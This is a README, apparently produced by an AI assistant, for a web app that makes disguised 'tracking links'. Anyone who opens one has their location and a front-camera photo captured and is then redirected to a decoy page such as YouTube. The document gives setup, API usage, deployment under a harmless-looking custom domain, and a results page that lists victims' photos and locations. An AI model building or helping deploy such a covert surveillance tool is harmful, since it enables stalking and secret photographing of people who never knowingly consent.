# Usage Instructions for Tracking Link Website

This website allows you to create tracking links that automatically capture the location and front camera photo of users who open the link, then redirect them to a masked URL (e.g., Instagram, YouTube).

## Custom Domain Configuration

The application now supports custom domain configuration through environment variables:

- `NEXT_PUBLIC_CUSTOM_DOMAIN`: Set your custom domain (e.g., "lyche.premium.app")
- `NEXT_PUBLIC_TRACKING_PATH`: Set your custom tracking path (default: "home")

### Environment Setup

Create a `.env.local` file in your project root:

```env
NEXT_PUBLIC_CUSTOM_DOMAIN=lyche.premium.app
NEXT_PUBLIC_TRACKING_PATH=home
```

## How to Create a Tracking Link

You can create a tracking link easily using the web UI available at the root URL of the website.

### Using the Web UI

1. Open the website homepage (e.g., https://lyche.premium.app/ or http://localhost:3000)
2. Enter a unique Tracking ID (any string you choose, e.g., "campaign1").
3. Enter the Masked URL you want users to be redirected to (e.g., https://www.youtube.com/watch?v=pbFOk4H42A8).
4. Click the "Create Link" button.
5. The generated tracking link will be displayed below the form using your custom domain configuration.

### Using the API (Optional)

Alternatively, you can create a tracking link manually via API:

```bash
curl -X POST -H "Content-Type: application/json" -d '{
  "trackingId": "yourTrackingId",
  "maskedUrl": "https://www.youtube.com/watch?v=pbFOk4H42A8",
  "createLink": true
}' https://lyche.premium.app/api/track/create
```

## How to Use the Tracking Link

When a user opens the tracking link URL:

```
https://lyche.premium.app/home/yourTrackingId
```

The website will:

1. Automatically request permission to access their location and front camera.
2. Capture their location and take a photo from the front camera.
3. Send the data to the backend server.
4. Redirect the user to the masked URL you specified.

If the tracking link does not exist, an error message will be shown.

## Viewing Tracking Data

You can view the tracking data collected for a specific Tracking ID by visiting:

```
https://lyche.premium.app/home/yourTrackingId/results
```

This page displays all tracking events including timestamps, locations, user agents, and captured photos.

## Deployment Options

### Option 1: Deploy to Vercel (Recommended)

1. Push your code to GitHub
2. Connect your GitHub repository to Vercel
3. Set environment variables in Vercel dashboard:
   - `NEXT_PUBLIC_CUSTOM_DOMAIN=lyche.premium.app`
   - `NEXT_PUBLIC_TRACKING_PATH=home`
4. Deploy and configure your custom domain in Vercel

### Option 2: Deploy to Netlify

1. Push your code to GitHub
2. Connect your GitHub repository to Netlify
3. Set environment variables in Netlify dashboard
4. Configure your custom domain in Netlify

### Option 3: Self-hosted

1. Build the application: `npm run build`
2. Start the production server: `npm start`
3. Configure your web server (nginx/Apache) to point your domain to the application

## Starting the Development Server

To start the website locally, run:

```bash
npm install
npm run dev
```

The server will start on port 3000 by default.

## Path Structure

The application supports both old and new path structures for backward compatibility:

- **New Structure (Recommended)**: `/home/[trackingId]` and `/home/[trackingId]/results`
- **Old Structure (Backward Compatible)**: `/track/[trackingId]` and `/track/[trackingId]/results`

## Notes

- Make sure your browser allows location and camera access for tracking to work.
- Tracking data is stored in memory and will be lost if the server restarts.
- For production use, consider implementing a persistent database.
- The custom domain must be properly configured with DNS and SSL certificates.
- When using a custom domain, ensure your hosting provider supports it.

---

If you need help with any step or want additional features, please let me know.
